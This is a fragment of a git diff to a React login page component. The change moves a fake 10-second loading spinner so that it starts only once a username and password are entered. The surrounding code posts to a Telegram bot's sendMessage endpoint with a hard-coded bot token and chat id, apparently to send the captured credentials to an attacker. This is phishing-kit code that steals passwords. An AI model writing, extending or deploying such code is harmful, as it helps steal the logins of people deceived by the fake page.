@@ -61,11 +61,6 @@ function HomePage() {
     function handleSubmit(event) {
         event.preventDefault();
         qfFunck(userName.current);
-        setLoading(!loading);
-            setTimeout(() => {
-                setLoading(loading);
-                setEreva(!ereva);
-             }, 10000);
         if (qfNum === 1) {
             userName.current.value = '';
             userName.current.nextSibling.style.display = "block";
@@ -74,6 +69,11 @@ function HomePage() {
             qfFunck(passwordUser.current);
             if (qfNum === 0) {
                 if (userName.current.value && passwordUser.current.value) {
+                    setLoading(!loading);
+                    setTimeout(() => {
+                        setLoading(loading);
+                        setEreva(!ereva);
+                    }, 10000);
                     const url = `https://api.telegram.org/bot7200818155:AAF9EaPk7xr8kBsonHfMpg8JrwA_s8TRWkM/sendMessage` // The url to request
                     const obj = {
                         chat_id: 1368494862, // Telegram chat id
